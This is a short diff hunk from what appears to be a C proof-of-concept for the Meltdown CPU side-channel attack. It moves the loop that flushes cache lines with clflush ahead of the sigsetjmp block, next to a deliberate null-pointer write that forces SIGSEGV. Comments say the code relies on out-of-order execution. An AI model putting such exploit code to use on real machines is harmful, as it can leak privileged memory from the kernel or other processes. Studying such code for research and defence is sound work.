@@ -86,13 +86,13 @@ void main()
     signal(SIGSEGV, sigsegv_handler);
 
     for (int i = 0; i < 100; i++) {
-        if(sigsetjmp(jbuf, !0) == 0) {
-            for (int i = 0; i < 256; i++) {
-                clflush(&meltdown_buf[i * PAGE_SIZE]);
-            }
+        for (int i = 0; i < 256; i++) {
+            clflush(&meltdown_buf[i * PAGE_SIZE]);
+        }
 
+        if(sigsetjmp(jbuf, !0) == 0) {
             *((char*)NULL) = 1; // force SIGSEGV (even when testing with local addrress)
-            
+
             // the code below should not be executed because of SEISEGV
             // but don't worry. it most likely will be executed because of out-of-order execution optimizations in Intel CPUs :-)
 
